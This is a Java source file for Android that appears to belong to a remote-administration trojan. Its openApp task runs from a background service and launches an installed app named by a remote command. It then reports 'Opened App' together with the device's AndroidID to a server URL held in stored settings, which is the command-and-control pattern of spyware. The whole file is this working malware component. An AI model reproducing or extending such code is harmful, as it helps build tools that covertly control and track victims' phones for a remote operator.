package u.can.i.up.expert.utils;

import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import java.io.UnsupportedEncodingException;
import java.util.List;

import u.can.i.up.expert.common.DataSet;
import u.can.i.up.expert.common.Factory;

/**
 * Created by lczgywzyy on 2015/1/13.
 */
public class openApp extends AsyncTask<String, Void, String> {
    String i = "";
    public openApp(String i) {
        this.i = i;
    }
    @Override
    protected String doInBackground(String... params) {
        final PackageManager packageManager = DataSet.getInstance().myService.getApplicationContext().getPackageManager();
        List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
        for (ApplicationInfo appInfo : installedApplications)
        {
            if(appInfo.packageName.equals(i))
            {
                Intent k = new Intent();
                PackageManager manager = DataSet.getInstance().myService.getPackageManager();
                k = manager.getLaunchIntentForPackage(i);
                k.addCategory(Intent.CATEGORY_LAUNCHER);
                DataSet.getInstance().myService.startActivity(k);

                try {
                    Factory.getInputStreamFromUrl(DataSet.getInstance().URL + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(DataSet.getInstance().myService.getApplicationContext()).getString("AndroidID", "") + "&Data=", "Opened App: " + i);
                } catch (UnsupportedEncodingException e) {

                    e.printStackTrace();
                }
            }
        }
        return "Executed";
    }
    @Override
    protected void onPostExecute(String result) {/*httpcalldone*/}
    @Override
    protected void onPreExecute() {/*httpcallexecuting*/}
    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
